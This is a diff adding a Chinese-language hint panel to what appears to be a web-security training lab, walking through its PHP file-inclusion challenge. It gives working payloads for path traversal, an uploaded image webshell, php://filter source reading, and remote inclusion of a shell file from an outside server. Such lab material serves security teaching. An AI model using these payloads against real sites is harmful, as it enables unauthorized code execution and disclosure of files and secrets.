@@ -1,0 +1,19 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>文件包含的核心是 <code>?page=</code> 参数的值直接被拿去包含文件。思路分三层：① 用 <code>../</code> 路径穿越跳出当前目录，读系统文件或站点配置；② 配合上传关传一张图片马（内容是 PHP 代码），再包含它就能执行 PHP；③ 读 PHP 源码不能直接包含（会被执行），要用 <code>php://filter</code> 先 base64 编码再读。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>目标1 - 读系统文件（相对路径从 modules/fileinc/ 出发）：</b><br>
+<code>?page=../../../../Windows/win.ini</code><br>
+<code>?page=../../config.php</code>（会直接执行看不到源码，需要目标3的方法）<br>
+<b>目标2 - 图片马 getshell：</b><br>
+1. 模块9 上传 <code>shell.jpg</code>（内容为 <code>&lt;?php phpinfo();?&gt;</code>）<br>
+2. <code>?page=../../uploads/shell.jpg</code> &rarr; jpg 里的 php 代码被执行！<br>
+<b>目标3 - php://filter 读源码：</b><br>
+<code>?page=php://filter/read=convert.base64-encode/resource=index.php</code><br>
+输出是 base64，解码后就是源码。<br>
+<b>进阶：</b>如果 phpstudy 开启 allow_url_include，还可以 <code>?page=http://远程服务器/shell.txt</code> 远程包含。
+</div>
+</details>
